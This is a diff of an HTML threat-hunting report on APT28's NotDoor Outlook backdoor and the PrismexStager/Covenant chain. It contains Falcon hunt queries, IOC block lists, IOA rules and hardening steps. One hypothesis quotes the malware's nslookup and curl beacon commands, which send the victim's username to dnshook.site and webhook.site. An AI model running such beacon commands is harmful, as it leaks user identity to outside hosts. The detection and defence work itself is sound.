+        <div class="qc-badges"><span class="badge b-low">CONF MED-HIGH</span><span class="badge b-med">FP LOW-MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql3',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql3')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Outlook VBA / macro-on-boot registry changes (the NotDoor/MiniDoor persistence). <strong>Accomplishes:</strong> the email-stealer install. <strong>FP:</strong> sanctioned Outlook macros — rare; verify.</p>
+<pre class="cql" id="cql3"><span class="cm">// HUNT: MiniDoor / NotDoor Outlook email-stealer persistence</span>
+<span class="cm">// MITRE: T1137, T1114 | CONF: med-high  FP: low-med  COST: low</span>
+<span class="cm">// TUNING: Outlook VBA is rare in most orgs; alert on VbaProject.OTM / LoadMacroProviderOnBoot</span>
+#event_simpleName=/AsepValueUpdate|RegGenericValueUpdate|PeFileWritten|FileCreateInfo/
+| (RegObjectName=/\\Office\\.+\\Outlook\\.+(LoadMacroProviderOnBoot|Security\\Level)/i
+   or TargetFileName=/\\Outlook\\VbaProject\.OTM$/i)
+| table([@timestamp, ComputerName, UserName, RegObjectName, RegStringValue, TargetFileName])</pre>
       </div>
     </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1071.001 / T1568.002 / T1567</div>
-      <div><strong>Timeframe:</strong> Last 30 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+ (DNS events)</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> PrismexStager (CovenantGrunt) polls filen.io across 24 subdomains (<code>gateway.*</code>, <code>ingest.*</code>, <code>egest.*</code>). In most enterprises, filen.io is not sanctioned. Even where it is, the access should come from a real browser — not from <code>powershell.exe</code>, <code>rundll32.exe</code>, or a random .NET host.</p>
-      <p><strong>FP Notes:</strong> Users with personal filen.io accounts using sanctioned browsers (allow-list <code>chrome.exe|firefox.exe|msedge.exe</code>). If filen.io is enterprise-sanctioned, narrow the exclusion to corporate-managed browser instances only.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q5" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q5">// HUNT: APT28 PrismexStager - T1071.001/T1568.002 - filen.io C2 from non-browser
-// HYPOTHESIS: PrismexStager polls 24 filen.io subdomains for encrypted task files.
-//             Legitimate filen.io access (if any) should originate from a browser.
-// FP RISK: Medium - depends on whether filen.io is enterprise-sanctioned
-// FP NOTES:
-//   - Personal use of filen.io via chrome/edge/firefox (allow-list those parents)
-//   - If filen.io IS sanctioned, restrict allow-list to corporate-managed browsers
-// CONFIDENCE: High - the LOLBin-makes-cloud-call pattern is exploitation-grade
-// TIMEFRAME: Last 30 days
 
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q4 · PixyNetLoader → Covenant Grunt execution</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql4',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql4')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> a user-path binary spawning a .NET-host process or known Covenant Grunt behavior (rundll32/regsvr32 loading a temp DLL; GruntStager strings). <strong>FP:</strong> correlate with Q1/Q2; Covenant is generic — tune.</p>
+<pre class="cql" id="cql4"><span class="cm">// HUNT: PixyNetLoader -> Covenant Grunt</span>
+<span class="cm">// MITRE: T1574, T1071.001 | CONF: medium  FP: medium  COST: low</span>
+<span class="cm">// TUNING: Covenant is a public framework; correlate to Q1/Q2 + tune GruntStager indicators</span>
+#event_simpleName=/ProcessRollup2|SyntheticProcessRollup2/
+| (CommandLine=/(GruntStager|Grunt\.exe|Covenant|csc\.exe.+\\Temp\\.+\.cs)/i
+   or (FileName=/^(rundll32|regsvr32)\.exe$/i and CommandLine=/\\(Temp|AppData)\\.+\.dll/i))
+| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q5 · Covenant / filen.io C2 &amp; exfil</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-med">FP MED</span><span class="badge b-med">COST MED</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql5',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql5')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> DNS/connections to <code>filen.io</code> (staging/exfil) or Covenant C2 from a user-path binary. <strong>FP:</strong> filen.io is a legit service — flag from a non-sanctioned process; correlate with Q4.</p>
+<pre class="cql" id="cql5"><span class="cm">// HUNT: APT28 C2 / exfil (filen.io staging / Covenant)</span>
+<span class="cm">// MITRE: T1071.001, T1567.002 | CONF: medium  FP: medium  COST: med</span>
+<span class="cm">// TUNING: filen.io is legitimate; flag from non-sanctioned processes; correlate to Q4</span>
 #event_simpleName=DnsRequest
-| DomainName = /\.filen\.io$/i
-| join({#event_simpleName=ProcessRollup2 | select([aid, TargetProcessId_decimal, ImageFileName, CommandLine, ParentBaseFileName])},
-       field=[aid, ContextProcessId_decimal], key=[aid, TargetProcessId_decimal], include=[ImageFileName, CommandLine, ParentBaseFileName])
-| !ImageFileName = /\\(chrome|msedge|firefox|brave|opera|iexplore)\.exe$/i
-| groupBy([aid, ComputerName, UserName, ImageFileName, ParentBaseFileName],
-    function=[count(), collect([DomainName], limit=25)])
-| sort(_count, order=desc)</pre>
+| DomainName=/(^|\.)filen\.io$/i
+| ContextBaseFileName!=/^(filen|filen-desktop)\.exe$/i
+| table([@timestamp, ComputerName, ContextBaseFileName, DomainName])</pre>
+      </div>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q6 · Vulnerable Office build inventory (CVE-2026-21509)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MED</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions"><button class="btn-copy" onclick="copyQuery('cql6',this)">Copy CQL</button><button class="btn-falcon" onclick="openFalcon('cql6')">Open in Falcon</button></div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Office process versions predating the 26 Jan 2026 OOB fix. <strong>Accomplishes:</strong> exposure inventory — the patch is the fix. <strong>FP:</strong> low; cross-check build numbers per channel.</p>
+<pre class="cql" id="cql6"><span class="cm">// HUNT: vulnerable Office build inventory (CVE-2026-21509)</span>
+<span class="cm">// MITRE: T1203 | CONF: medium  FP: low  COST: low</span>
+<span class="cm">// TUNING: map FileVersion to the 26 Jan 2026 OOB patched builds per Office channel</span>
+#event_simpleName=/ProcessRollup2|SyntheticProcessRollup2/
+| FileName=/^winword\.exe$/i
+| groupBy([ComputerName, FileVersion], function=count())
+| table([ComputerName, FileVersion, _count])</pre>
       </div>
     </div>
   </div>
-
-  <!-- Q6 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q6</span> Beacon to <code>dnshook.site</code> / <code>webhook.site</code> (NotDoor staging callback)</div>
-      <div>
-        <span class="badge good">FP RISK: LOW</span>
-        <span class="badge good">CONF: HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1071.001 / T1102</div>
-      <div><strong>Timeframe:</strong> Last 30 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+ (DNS events)</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> NotDoor's encoded PowerShell stage runs <code>nslookup $env:USERNAME.&lt;guid&gt;.dnshook.site</code> and <code>curl http://webhook.site/&lt;guid&gt;?$env:USERNAME</code> as install-verification beacons. These services exist legitimately for developer testing but are rare in normal production traffic.</p>
-      <p><strong>FP Notes:</strong> Developer test workloads (CI runners, ngrok-adjacent dev work) — allow-list dev/test segments.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q6" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q6">// HUNT: APT28 NotDoor - T1071.001/T1102 - dnshook.site / webhook.site beacon
-// HYPOTHESIS: NotDoor's PowerShell stage emits install-confirmation beacons to
-//             dnshook.site (DNS) and webhook.site (HTTP) embedding $env:USERNAME.
-// FP RISK: Low - these domains are rare in production enterprise traffic
-// FP NOTES:
-//   - Developer / CI test workloads (allow-list dev segments)
-// CONFIDENCE: High - direct IOC observed in Splunk Threat Research analysis
-// TIMEFRAME: Last 30 days
-
-#event_simpleName=DnsRequest
-| DomainName = /(^|\.)(dnshook|webhook)\.site$/i
-| join({#event_simpleName=ProcessRollup2 | select([aid, TargetProcessId_decimal, ImageFileName, CommandLine, ParentBaseFileName])},
-       field=[aid, ContextProcessId_decimal], key=[aid, TargetProcessId_decimal], include=[ImageFileName, CommandLine, ParentBaseFileName])
-| table([@timestamp, aid, ComputerName, UserName, DomainName, ImageFileName, ParentBaseFileName, CommandLine])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
-  </div>
-
-  <!-- Q7 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q7</span> Encoded PowerShell with <code>OneDrive.exe</code> parent (NotDoor execution)</div>
-      <div>
-        <span class="badge good">FP RISK: LOW</span>
-        <span class="badge good">CONF: HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1059.001 / T1027.010 / T1574.001</div>
-      <div><strong>Timeframe:</strong> Last 30 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> Once the malicious SSPICLI.dll loads inside the staged OneDrive.exe, it spawns base64-encoded PowerShell to copy <code>testtemp.ini</code> into Outlook's macro store. Legitimate OneDrive never invokes PowerShell with <code>-EncodedCommand</code>.</p>
-      <p><strong>FP Notes:</strong> Effectively none for the genuine OneDrive process. False positives would have to come from a separate program also named OneDrive.exe — very rare.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q7" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q7">// HUNT: APT28 NotDoor - T1059.001/T1027.010 - Encoded PowerShell parented to OneDrive
-// HYPOTHESIS: The malicious SSPICLI.dll inside the staged OneDrive.exe spawns encoded
-//             PowerShell to copy testtemp.ini → VbaProject.OTM. Legit OneDrive doesn't.
-// FP RISK: Low - real OneDrive does not invoke -EncodedCommand PowerShell
-// FP NOTES:
-//   - None expected for genuine OneDrive
-// CONFIDENCE: High - direct execution-stage signal
-// TIMEFRAME: Last 30 days
-
-#event_simpleName = /ProcessRollup2|SyntheticProcessRollup2/
-| ParentBaseFileName = /^onedrive\.exe$/i
-| FileName = /^powershell(_ise)?\.exe$|^pwsh\.exe$/i
-| CommandLine = /[-/](e|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\s+/i
-| table([@timestamp, aid, ComputerName, UserName, ParentImageFileName, ImageFileName, CommandLine])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
-  </div>
-
-  <!-- Q8 -->
-  <div class="query">
-    <div class="query-head">
-      <div class="query-title"><span class="qid">Q8</span> Office (winword / excel) spawning child after RTF/attachment open</div>
-      <div>
-        <span class="badge warn">FP RISK: MEDIUM</span>
-        <span class="badge info">CONF: MEDIUM-HIGH</span>
-      </div>
-    </div>
-    <div class="query-meta">
-      <div><strong>MITRE:</strong> T1203 + T1566.001</div>
-      <div><strong>Timeframe:</strong> Last 14 days</div>
-      <div><strong>Requires:</strong> Falcon Pro+</div>
-    </div>
-    <div class="query-body">
-      <p><strong>Hypothesis:</strong> CVE-2026-21509 exploitation manifests as <code>winword.exe</code> or <code>excel.exe</code> spawning a script interpreter, LOLBin, or .NET host immediately after opening an attachment. This is the runtime tell of the initial-access stage.</p>
-      <p><strong>FP Notes:</strong> Macros are still in use in some shops. Tune by excluding signed-macro AIDs and known reporting / data-tools workloads. <strong>Pair with the Office trust-center policy state</strong> (Q4-style registry hunt) — orgs where macros are blocked-from-internet by GPO should see effectively zero hits.</p>
-      <div class="code-wrap">
-        <div class="code-actions">
-          <button class="btn copy-btn" onclick="copyQuery(this)"><span class="btn-icon">⎘</span> Copy Query</button>
-          <a class="btn open-falcon" data-query-id="q8" href="#" target="_blank" rel="noopener"><span class="btn-icon">↗</span> Open in Falcon</a>
-        </div>
-<pre id="q8">// HUNT: APT28 PRISMEX - T1203/T1566.001 - Office child process after attachment open
-// HYPOTHESIS: CVE-2026-21509 exploitation lands in winword/excel and spawns interpreter/.NET host.
-// FP RISK: Medium - shops with macros still produce some legitimate hits
-// FP NOTES:
-//   - Signed macros for finance/data tools (allow-list publisher AIDs)
-//   - Reporting workloads that auto-launch script from Excel (document and allow-list)
-// CONFIDENCE: Medium-High - pair with Q1 (Outlook→child) and Q3 (OneDrive sideload) to confirm
-// TIMEFRAME: Last 14 days
-
-#event_simpleName = /ProcessRollup2|SyntheticProcessRollup2/
-| ParentBaseFileName = /^(winword|excel|powerpnt|outlook|wordpad)\.exe$/i
-| in(field=FileName, values=["cmd.exe","powershell.exe","powershell_ise.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","installutil.exe","msbuild.exe","dotnet.exe"], ignoreCase=true)
-| table([@timestamp, aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine])
-| sort(@timestamp, order=desc)</pre>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- IOCS -->
-<section id="iocs">
-  <h2>IOC Blocklist Template</h2>
-  <p>
-    Use this section as a starting point for Falcon IOC Management imports, NGFW URL blocks, and email gateway rules.
-    <strong>Decide on filen.io carefully:</strong> it is a legitimate cloud service used by real users. Outright blocking the
-    entire domain may break legitimate workflows. The recommended approach is monitor-and-detect (Q5 covers it) unless your
-    environment explicitly does not sanction filen.io, in which case a hard block at the egress proxy is appropriate.
-  </p>
-
-  <h3>File Hashes (SHA256)</h3>
-  <table>
-    <tr><th>Hash</th><th>Filename</th><th>Component</th><th>Action</th></tr>
-    <tr><td><code>5a88a15a1d764e635462f78a0cd958b17e6d22c716740febc114a408eef66705</code></td><td>SSPICLI.dll</td><td>NotDoor malicious sideload</td><td>BLOCK</td></tr>
-    <tr><td><code>8f4bca3c62268fff0458322d111a511e0bcfba255d5ab78c45973bd293379901</code></td><td>testtemp.ini</td><td>NotDoor VBA macro (pre-staging)</td><td>BLOCK</td></tr>
-  </table>
-
-  <h3>Domains</h3>
-  <table>
-    <tr><th>Domain</th><th>Use</th><th>Recommended Action</th></tr>
-    <tr><td><code>*.dnshook.site</code></td><td>NotDoor install-verification beacon (DNS)</td><td>BLOCK at DNS resolver and NGFW egress</td></tr>
-    <tr><td><code>webhook.site</code></td><td>NotDoor install-verification beacon (HTTP)</td><td>BLOCK at egress proxy (consider category-block "developer tools" unless allow-listed for dev teams)</td></tr>
-    <tr><td><code>*.filen.io</code> (24 subdomains: gateway.*, ingest.*, egest.*)</td><td>PrismexStager / CovenantGrunt C2</td><td><strong>Monitor</strong> (default) — Q5 detects non-browser access. <strong>BLOCK</strong> only if cloud-storage policy already prohibits filen.io.</td></tr>
-  </table>
-
-  <h3>File Paths (host artifacts)</h3>
-  <ul>
-    <li><code>C:\ProgramData\OneDrive.exe</code> — staged legitimate binary (not the real install location)</li>
-    <li><code>C:\ProgramData\SSPICLI.dll</code> — malicious sideloaded DLL</li>
-    <li><code>C:\ProgramData\tmp7E9C.dll</code> — renamed legitimate sspicli.dll (used to keep OneDrive from crashing)</li>
-    <li><code>C:\ProgramData\testtemp.ini</code> — pre-staging copy of the VBA macro</li>
-    <li><code>%APPDATA%\Microsoft\Outlook\VbaProject.OTM</code> — Outlook macro installed (T1137.005)</li>
-    <li><code>%TEMP%\Test\</code> — working directory created by NotDoor at execution</li>
-  </ul>
-
-  <h3>CSV template for Falcon IOC Management bulk import</h3>
-  <div class="code-wrap">
-    <div class="code-actions">
-      <button class="btn" onclick="copyQuery(this)">Copy</button>
-    </div>
-<pre id="ioc-csv">type,value,action,severity,description,source,expiration,platforms
-sha256,5a88a15a1d764e635462f78a0cd958b17e6d22c716740febc114a408eef66705,prevent,high,APT28 NotDoor - malicious SSPICLI.dll sideload,Splunk-TRT,2026-11-16,windows
-sha256,8f4bca3c62268fff0458322d111a511e0bcfba255d5ab78c45973bd293379901,prevent,high,APT28 NotDoor - testtemp.ini VBA backdoor staging,Splunk-TRT,2026-11-16,windows
-domain,dnshook.site,detect,medium,APT28 NotDoor - install verification beacon (DNS),Splunk-TRT,2026-11-16,windows
-domain,webhook.site,detect,medium,APT28 NotDoor - install verification beacon (HTTP),Splunk-TRT,2026-11-16,windows</pre>
-  </div>
-
-  <h3>IOC Governance</h3>
-  <ul>
-    <li><strong>Severity:</strong> hashes = High (matched only on the specific implant); domains = Medium (legitimate developer use overlaps with NotDoor beacons).</li>
-    <li><strong>Action:</strong> hashes → <code>prevent</code> after a 7-day audit; domains → <code>detect</code> until you confirm zero legitimate dev-team use (or scope the dev-team allow-list).</li>
-    <li><strong>Expiration:</strong> 6 months. Re-validate before extension — APT28 rotates infrastructure regularly.</li>
-    <li><strong>Source attribution:</strong> note the upstream reporter (Splunk-TRT, Trellix, Trend Micro, Zscaler) for traceability.</li>
-  </ul>
-</section>
-
-<!-- IOAs -->
-<section id="ioa">
-  <h2>Custom IOA Recommendations</h2>
-  <p>
-    These IOAs are designed for the Falcon "Custom IOAs" feature. Deploy in <strong>Detect</strong> mode for at least 14 days
-    on a representative sample of endpoints, validate that no business-critical workflow trips them, then promote to
-    <strong>Block</strong>. Each IOA below maps to the indicators of attack identified in the queries above.
-  </p>
-
-  <h3>IOA-1 — outlook.exe spawning script interpreter</h3>
-  <table>
-    <tr><th>Field</th><th>Value</th></tr>
-    <tr><td>Rule type</td><td>Process Creation</td></tr>
-    <tr><td>Image filename</td><td><code>.*\\(cmd|powershell|powershell_ise|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\.exe$</code></td></tr>
-    <tr><td>Parent image filename</td><td><code>.*\\outlook\.exe$</code></td></tr>
-    <tr><td>Severity</td><td>High</td></tr>
-    <tr><td>Action</td><td>Detect → Block (after 14d validation)</td></tr>
-    <tr><td>Maps to</td><td>Q1, MITRE T1059.005 / T1059.001</td></tr>
-  </table>
-
-  <h3>IOA-2 — VbaProject.OTM written by non-Outlook process</h3>
-  <table>
-    <tr><th>Field</th><th>Value</th></tr>
-    <tr><td>Rule type</td><td>File Creation</td></tr>
-    <tr><td>File path</td><td><code>.*\\AppData\\Roaming\\Microsoft\\Outlook\\VbaProject\.OTM$</code></td></tr>
-    <tr><td>Excluded image</td><td><code>.*\\OUTLOOK\.EXE$</code> (case-insensitive)</td></tr>
-    <tr><td>Severity</td><td>Critical</td></tr>
-    <tr><td>Action</td><td>Block immediately (no false-positive history in clean fleets)</td></tr>
-    <tr><td>Maps to</td><td>Q2, MITRE T1137.005</td></tr>
-  </table>
-
-  <h3>IOA-3 — OneDrive.exe execution from C:\ProgramData</h3>
-  <table>
-    <tr><th>Field</th><th>Value</th></tr>
-    <tr><td>Rule type</td><td>Process Creation</td></tr>
-    <tr><td>Image filename</td><td><code>.*\\ProgramData\\(.*\\)?OneDrive\.exe$</code></td></tr>
-    <tr><td>Severity</td><td>High</td></tr>
-    <tr><td>Action</td><td>Detect → Block (after 7d validation)</td></tr>
-    <tr><td>Maps to</td><td>Q3, MITRE T1574.001</td></tr>
-  </table>
-
-  <h3>IOA-4 — Encoded PowerShell parented to OneDrive.exe</h3>
-  <table>
-    <tr><th>Field</th><th>Value</th></tr>
-    <tr><td>Rule type</td><td>Process Creation</td></tr>
-    <tr><td>Image filename</td><td><code>.*\\(powershell|powershell_ise|pwsh)\.exe$</code></td></tr>
-    <tr><td>Parent image filename</td><td><code>.*\\onedrive\.exe$</code></td></tr>
-    <tr><td>Command line</td><td><code>.*[-/](e|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\s+.*</code></td></tr>
-    <tr><td>Severity</td><td>Critical</td></tr>
-    <tr><td>Action</td><td>Block immediately</td></tr>
-    <tr><td>Maps to</td><td>Q7, MITRE T1059.001 / T1027.010</td></tr>
-  </table>
-
-  <h3>IOA-5 — Outlook macro security weakening</h3>
-  <table>
-    <tr><th>Field</th><th>Value</th></tr>
-    <tr><td>Rule type</td><td>Registry Operation</td></tr>
-    <tr><td>Registry path</td><td><code>.*\\Software\\Microsoft\\Office\\[^\\]+\\Outlook\\Security$</code></td></tr>
-    <tr><td>Registry value name</td><td><code>Level</code></td></tr>
-    <tr><td>Registry value data</td><td><code>1</code> (enable all macros)</td></tr>
-    <tr><td>Excluded image</td><td>GPO Client svchost contexts, Intune Management Extension</td></tr>
-    <tr><td>Severity</td><td>High</td></tr>
-    <tr><td>Action</td><td>Detect → Block (after 14d to validate GPO/Intune flow)</td></tr>
-    <tr><td>Maps to</td><td>Q4, MITRE T1112</td></tr>
-  </table>
-
-  <h3>Promotion criteria (Detect → Block)</h3>
-  <ul>
-    <li><strong>IOA-2 (VbaProject.OTM)</strong> — promote immediately. No legitimate FP expected.</li>
-    <li><strong>IOA-1, IOA-3, IOA-4</strong> — promote after 14 days with zero validated FPs.</li>
-    <li><strong>IOA-5</strong> — promote only after confirming GPO/Intune rollouts come from documented service contexts and have allow-list exclusions in place.</li>
-  </ul>
-</section>
-
-<!-- HARDENING -->
-<section id="hardening">
-  <h2>Hardening Recommendations</h2>
-  <p>
-    The chain has three natural choke points: <strong>(1)</strong> the initial Office exploit (CVE-2026-21509), <strong>(2)</strong> Outlook
-    spawning child processes / DLL sideloading, and <strong>(3)</strong> outbound traffic to cloud-native C2. The controls below are
-    organized by deployment friction (Immediate / Short-term / Long-term) and every recommendation cites at least one framework
-    (MITRE M-number, CIS Benchmark item, MS Security Baseline GPO path) — per the <code>threat-hardening</code> skill's standard shape.
-  </p>
-
-  <div class="callout callout-crit">
-    <strong>Patch first.</strong> Confirm Office is at or beyond the February 2026 cumulative update that ships the CVE-2026-21509 (and CVE-2026-21513) fixes on every endpoint. Microsoft 365 Apps, Office LTSC 2024, and Office 2021/2019 perpetual all have patches. <strong>Endpoints more than one Patch Tuesday behind on Office should be treated as exposed until verified.</strong>
-  </div>
-
-  <!-- IMMEDIATE -->
-  <div class="tier tier-immediate">
-    <h3>Immediate (deploy this week) <span class="tier-label">Tier 1</span></h3>
-    <ul>
-      <li>
-        <strong>Enable ASR rule <code>D4F940AB-401B-4EFC-AADC-AD5F3C50688A</code></strong> — Block Office apps from creating child processes. Directly blocks the Outlook→script-interpreter pattern (Q1) and the winword/excel→child pattern (Q8).
-        <span class="fw">MITRE M1040 · CIS Microsoft Windows 10/11 Enterprise 18.9.47.5.1.4 (L1) · MS Baseline <code>Computer Configuration &gt; Admin Templates &gt; Windows Components &gt; Microsoft Defender Antivirus &gt; Microsoft Defender Exploit Guard &gt; Attack Surface Reduction &gt; Configure Attack Surface Reduction rules</code></span>
-      </li>
-      <li>
-        <strong>Enable ASR rule <code>26190899-1602-49E8-8B27-EB1D0A1CE869</code></strong> — Block Office communication apps (Outlook) from creating child processes specifically. Layered with the above, eliminates Outlook child-spawn entirely.
-        <span class="fw">MITRE M1040 · CIS 18.9.47.5.1.15 (L1)</span>
-      </li>
-      <li>
-        <strong>Enable ASR rule <code>92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B</code></strong> — Block Win32 API calls from Office macros. Closes the API-injection escape that PrismexSheet uses to extract steganographic payload.
-        <span class="fw">MITRE M1040 · CIS 18.9.47.5.1.8 (L1)</span>
-      </li>
-      <li>
-        <strong>Enable ASR rule <code>3B576869-A4EC-4529-8536-B80A7769E899</code></strong> — Block Office apps from creating executable content. Stops the post-decode payload write to disk.
-        <span class="fw">MITRE M1040 · CIS 18.9.47.5.1.5 (L1)</span>
-      </li>
-      <li>
-        <strong>Enable ASR rule <code>BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550</code></strong> — Block executable content from email and webmail. Stops the RTF/LNK chain at delivery for users opening attachments outside of corporate mail clients.
-        <span class="fw">MITRE M1040 · CIS 18.9.47.5.1.10 (L1)</span>
-      </li>
-      <li>
-        <strong>Block macros from running in Office files from the Internet</strong> via GPO. Microsoft 365 Apps enforce this by default since 2022; verify Office 2019/2021/LTSC perpetual installations have it set.
-        <span class="fw">MITRE M1054 · MS Baseline <code>User Configuration &gt; Admin Templates &gt; Microsoft Word &lt;ver&gt; &gt; Word Options &gt; Security &gt; Trust Center &gt; Block macros from running in Office files from the Internet = Enabled</code> (and same for Excel, PowerPoint, Outlook, Access, Visio)</span>
-      </li>
-      <li>
-        <strong>Set Outlook macro security to "Disable all macros without notification"</strong> — registry <code>HKCU\Software\Microsoft\Office\&lt;ver&gt;\Outlook\Security\Level = 4</code>. This makes NotDoor's VbaProject.OTM non-functional even if installed.
-        <span class="fw">MITRE M1054 · MS Baseline <code>Outlook &gt; Security &gt; Security Form Settings &gt; Macro Security = Disabled</code></span>
-      </li>
-      <li>
-        <strong>Block <code>*.dnshook.site</code> and <code>webhook.site</code></strong> at DNS resolver and NGFW egress (unless dev teams have documented use cases — then allow-list only those segments).
-        <span class="fw">MITRE M1021 · M1037</span>
-      </li>
-      <li>
-        <strong>Push the SHA256 hashes from §5 to Falcon IOC Management in Prevent mode</strong> after a 7-day audit-mode soak.
-        <span class="fw">MITRE M1040 · M1049</span>
-      </li>
-      <li>
-        <strong>Confirm Office is fully patched</strong> — CVE-2026-21509 and CVE-2026-21513 fixes in the Feb 2026 cumulative update. Run <code>Get-AppXPackage Microsoft.OfficeHub</code> on a sample + check Office click-to-run channel version against the Microsoft baseline.
-        <span class="fw">MITRE M1051</span>
-      </li>
-    </ul>
-  </div>
-
-  <!-- SHORT-TERM -->
-  <div class="tier tier-short">
-    <h3>Short-term (1–4 weeks, requires piloting) <span class="tier-label">Tier 2</span></h3>
-    <ul>
-      <li>
-        <strong>Deploy Defender for Office 365 Safe Attachments + Safe Links</strong> (or equivalent — Proofpoint TAP, Mimecast). Detonate inbound attachments in a sandbox before delivery; rewrites all URLs for runtime evaluation. APT28's RTF + LNK chain is sandbox-detectable.
-        <span class="fw">MITRE M1031 · M1021</span>
-      </li>
-      <li>
-        <strong>Conditional Access policy blocking unsanctioned cloud storage</strong> in Entra ID. If your org doesn't sanction filen.io, dropbox.com personal, mega.nz, etc., a CA policy that requires compliant device + corporate-managed browser for any of those URLs surfaces unmanaged-cloud-storage use across your fleet — including PrismexStager.
-        <span class="fw">MITRE M1037 · M1018</span>
-      </li>
-      <li>
-        <strong>AppLocker / WDAC publisher rule that blocks <code>OneDrive.exe</code> from <code>C:\ProgramData\</code></strong> (legitimate OneDrive lives under <code>%LOCALAPPDATA%\Microsoft\OneDrive</code>). Layered defense against IOA-3.
-        <span class="fw">MITRE M1038 · M1045</span>
-      </li>
-      <li>
-        <strong>PowerShell ScriptBlock + Module logging enabled</strong> via GPO, with logs forwarded to LogScale or your SIEM. NotDoor's encoded PowerShell stage decodes into ScriptBlock log Event ID 4104 — a high-fidelity tripwire even if prevention misses.
-        <span class="fw">CIS 18.9.100.1 + 18.9.100.2 (L1) · MS Baseline <code>Admin Templates &gt; Windows Components &gt; Windows PowerShell &gt; Turn on PowerShell Script Block Logging = Enabled</code></span>
-      </li>
-      <li>
-        <strong>Disable PowerShell v2</strong> across the fleet. PSv2 bypasses ScriptBlock/Module logging entirely — attackers love it for exactly that reason. <code>Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2,MicrosoftWindowsPowerShellV2Root</code>.
-        <span class="fw">MITRE M1042</span>
-      </li>
-      <li>
-        <strong>Pilot Constrained Language Mode (CLM) for PowerShell</strong> via AppLocker on knowledge-worker tier. Breaks reflective .NET assembly loading (T1620) used by PrismexStager — though pilot carefully, as some legitimate admin scripts rely on full-language mode.
-        <span class="fw">MITRE M1038 · M1044</span>
-      </li>
-      <li>
-        <strong>Falcon Identity Protection policies</strong> (if licensed) covering anomalous interactive logon patterns. APT28's long-haul access via NotDoor produces unusual mailbox-to-endpoint patterns that Identity Protection surfaces.
-        <span class="fw">MITRE M1031</span>
-      </li>
-    </ul>
-  </div>
-
-  <!-- STRATEGIC -->
-  <div class="tier tier-strategic">
-    <h3>Long-term / structural (1–3 months) <span class="tier-label">Tier 3</span></h3>
-    <ul>
-      <li>
-        <strong>Disable VBA for Office entirely</strong> for the knowledge-worker tier that doesn't need it. Set <code>HKCU\Software\Microsoft\Office\&lt;ver&gt;\Common\VBAOff = 1</code> via GPO. This is the structural fix that makes NotDoor and analogous VBA backdoors fundamentally impossible. Pilot first — gather a finance/data-team carve-out plan with explicit signed-macro exceptions before fleet-wide.
-        <span class="fw">MITRE M1042 · MS Baseline <code>Admin Templates &gt; Microsoft Office &lt;ver&gt; &gt; Security Settings &gt; Disable VBA for Office applications = Enabled</code></span>
-      </li>
-      <li>
